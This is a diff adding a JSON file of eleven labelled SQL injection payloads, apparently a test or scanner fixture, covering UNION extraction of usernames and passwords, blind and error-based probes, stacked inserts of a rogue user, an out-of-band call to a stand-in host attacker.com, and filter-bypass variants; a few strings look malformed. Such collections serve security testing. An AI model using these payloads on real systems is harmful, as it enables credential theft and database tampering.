@@ -1,0 +1,59 @@
+{
+    "sql_injection_cases": [
+        {
+            "id": "basic_union_select",
+            "description": "Basic UNION SELECT SQL injection to retrieve data from other tables.",
+            "payload": "' UNION SELECT null, username, password FROM users--"
+        },
+        {
+            "id": "time_based_blind",
+            "description": "Time-based blind SQL injection, where the query will cause the database to wait for a specified amount of time.",
+            "payload": "'; IF (SELECT * FROM Users WHERE Username = 'admin' AND SLEEP(5))--"
+        },
+        {
+            "id": "error_based",
+            "description": "Error-based SQL injection to retrieve database version and structure information.",
+            "payload": "admin' AND extractvalue(rand(),concat(0x3a,version()))--"
+        },
+        {
+            "id": "boolean_blind",
+            "description": "Boolean-based blind SQL injection, where the result of the query will change the content based on a true or false condition.",
+            "payload": "' OR 1=1--"
+        },
+        {
+            "id": "stacked_queries",
+            "description": "Stacked queries SQL injection to execute multiple statements.",
+            "payload": "'; INSERT INTO users (username, password) VALUES ('hacker', 'password');--"
+        },
+        {
+            "id": "out_of_band",
+            "description": "Out-of-band SQL injection where data is retrieved using DNS or HTTP protocols.",
+            "payload": "' exec master..xp_dirtree '//attacker.com/a';--"
+        },
+        {
+            "id": "second_order",
+            "description": "Second-order SQL injection where the payload is stored and triggered when the stored data is later retrieved and used in a query.",
+            "payload": "'; UPDATE users SET email = 'hacker@example.com' WHERE username = 'admin';--"
+        },
+        {
+            "id": "comment_injection",
+            "description": "Using SQL comments to obfuscate injection payloads.",
+            "payload": "admin'/**/AND/**/'1'='1'--"
+        },
+        {
+            "id": "hex_encoded",
+            "description": "Hex-encoded SQL injection to bypass simple filters.",
+            "payload": "0x61646D696E' AND '1'='1"
+        },
+        {
+            "id": "string_concatenation",
+            "description": "String concatenation to form SQL queries and bypass filters.",
+            "payload": "'||'UNION'||'SELECT'||'username,password'||'FROM'||'users--"
+        },
+        {
+            "id": "parameter_pollution",
+            "description": "HTTP Parameter Pollution to exploit SQL injection on parameters.",
+            "payload": "username=admin&username=anything' OR '1'='1"
+        }
+    ]
+}
